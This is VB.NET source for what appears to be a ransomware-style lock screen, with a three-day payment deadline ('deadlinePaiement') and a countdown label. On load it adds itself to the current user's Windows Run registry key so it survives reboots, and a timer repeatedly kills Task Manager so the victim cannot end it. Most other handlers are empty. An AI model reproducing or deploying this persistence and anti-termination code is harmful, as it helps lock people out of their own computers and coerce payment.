Imports Microsoft.Win32

Public Class UserControl1
    Public Shared deadlinePaiement As Integer = 259200
    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click

    End Sub

    Private Sub Label1_Click(sender As Object, e As EventArgs) Handles Label1.Click

    End Sub

    Private Sub Label3_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub GroupBox2_Enter(sender As Object, e As EventArgs) Handles GroupBox2.Enter

    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click

    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click

    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click

    End Sub

    Private Sub Label9_Click(sender As Object, e As EventArgs) Handles Label9.Click

    End Sub

    Private Sub Label8_Click(sender As Object, e As EventArgs) Handles Label8.Click

    End Sub

    Private Sub Label6_Click(sender As Object, e As EventArgs) Handles Label6.Click

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            For Each proc As Process In Process.GetProcesses
                If proc.ProcessName = "Taskmgr" Then
                    proc.Kill()
                End If
            Next
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        While deadlinePaiement > 0
            lb_echeance.Text = "bouh"
        End While
    End Sub

    Private Sub UserControl1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim CurrentUser As Microsoft.Win32.RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run")
        With CurrentUser
            .OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run")
            .SetValue(Application.ProductName, Application.ExecutablePath)
        End With
        lb_date.Text = CType(Date.Now.Date, String) + " " + CType(Date.Now.TimeOfDay.ToString(), String)
        Timer2.Enabled = True
        Timer2.Start()
        Timer1.Start()
    End Sub
End Class
